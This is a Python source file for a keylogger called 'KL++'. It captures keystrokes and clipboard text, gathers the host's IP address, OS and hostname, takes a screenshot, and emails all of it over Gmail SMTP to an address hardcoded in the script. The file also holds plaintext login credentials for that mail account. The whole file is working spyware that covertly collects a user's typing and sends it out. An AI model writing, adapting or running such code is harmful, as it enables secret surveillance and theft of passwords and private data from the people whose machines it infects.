import pynput
import time
import pyperclip
import socket
import platform
import smtplib
import image
import pyscreenshot as ImageGrab
from email.message import EmailMessage
from pynput.keyboard import Key, Listener
start=time.time()
count=0
keys=""
end=0
stopper=0
CopiedTxT=''
while end<500:
    def computer_information():
        hostname=socket.gethostname()
        with open ('InfoPC.txt','a') as g:
            g.write("IP Address : " + socket.gethostbyname(hostname) + "\n")
            g.write("Processor : " + platform.processor() + "\n")
            g.write("System : " + platform.system()+ " " + platform.version()+ "\n")
            g.write("Host Name : " + hostname + "\n")
            g.write("Machine : " + platform.machine() + "\n")
    computer_information()

    def on_press(key):
        t=time.asctime()
        CopiedTxT=pyperclip.paste()
        global keys, count, stopper
        keys=keys+str(key)
        count=count+1
        stopper=stopper+1
        if count>0:
            count=0
            if pyperclip.paste()!='':
                write_file(t,str(CopiedTxT))
                pyperclip.copy('')
            write_file(t,str(keys))
            keys=""

    def write_file(t,keys):
        with open("keylog2.txt","a") as f:
            k=str(keys)
            if k.find("Key.backspace")>-1:
                f.write(t)
                f.write(" ")
                f.write("delPrev \n")
            elif k.find("space")>-1:
                f.write(" \n")
            elif k.find("enter")>-1:
                f.write("Entrée \n")
            elif k!=("Key.esc") :
                f.write(t)
                f.write(" ")
                k=str(keys)
                k=k.replace("'","")
                f.write(k)
                f.write(" \n")

    def on_release(key):
        if key == Key.esc or stopper>10:
            stop=time.time()
            Duration=stop-start
            dur=int(Duration)
            sen="Your KeyLogger has been active for: "
            sentence=sen+str(dur)+"s"
            write_file(sentence,keys)
            return False
    def take_screenshot():
        pic=ImageGrab.grab()
        pic.save("F:\Haythem\Codes\KL++++"+"\\"+"screenshot.png")
        

    def send_email():
        msg=EmailMessage()
        msg['Subject']='KL++'
        msg['From']='KeyLoggerHBH@gmail.com'
        msg['To']='KeyLoggerHBH@gmail.com'
        msg.set_content('KL++ Returns')
        files=['keylog2.txt','InfoPC.txt','screenshot.png']
        for file in files :
            if not file==files[2]:
                with open(file,'rb') as f:
                    file_data=f.read()
                    file_name=f.name
                msg.add_attachment(file_data,maintype='text',subtype='txt',filename=file_name)
            if file==files[2]:
                with open(file,'rb') as f:
                    file_data=f.read()
                    file_name=f.name
                msg.add_attachment(file_data,maintype='image',subtype='png',filename=file_name)
                
        with smtplib.SMTP_SSL('smtp.gmail.com',465) as smtp:
            smtp.login('KeyLoggerHBH@gmail.com','KeyLogger++HBH')
            smtp.send_message(msg)
    if stopper >10:
        take_screenshot()
        send_email()
        stopper=0
    end=end+1

    with Listener(on_press=on_press, on_release =on_release) as listener:
        listener.join()

